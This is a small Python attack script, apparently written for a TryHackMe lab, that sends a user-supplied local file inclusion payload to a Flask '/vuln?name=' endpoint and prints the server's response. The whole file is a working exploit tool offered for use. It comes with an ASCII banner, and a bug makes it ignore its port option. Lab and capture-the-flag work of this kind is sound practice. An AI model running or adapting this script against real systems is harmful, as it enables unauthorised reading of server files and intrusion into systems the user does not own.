import argparse
import requests
import sys

def print_banner():
    print("""
 _______________________        
|| $ py exploit.py      ||
|| : #####       24%    ||   
||                      ||
||                      ||
||______________________||
|________________________|
\\\\#######################\\\\
  \\\\######################\\\\
   \         ______        \     
    \________\_____\_______\\   

    """)


def main():
    print_banner()
 
    parser = argparse.ArgumentParser(usage='%(prog)s [options]')

    parser.add_argument('--ip', help='Your Active Machine IP Address', dest='machine_ip', metavar='')
    parser.add_argument('--lfi', help='LFI payload to use', dest='lfi_payload', metavar='')
    parser.add_argument('--port', help='Flask port (default 5000)', dest='port', metavar='', default=5000)

    if len(sys.argv) == 1:
        parser.print_help()
        return

    args = parser.parse_args()
    

    if args.lfi_payload:
        if args.machine_ip:
            machine_ip = args.machine_ip
            lfi_payload = args.lfi_payload
            
            if machine_ip.startswith("http://"): 
                pass
            else:
               machine_ip = "http://" + machine_ip             
            r = requests.get(f"{machine_ip}:5000/vuln?name={lfi_payload}")
            print(f"| Req sent : {machine_ip}:{args.port}\n| Paylod...: {lfi_payload}\n\n")
            print(r.text)
        else:
            print("[!] Please specify your THM Active Machine IP Address")

    
main()
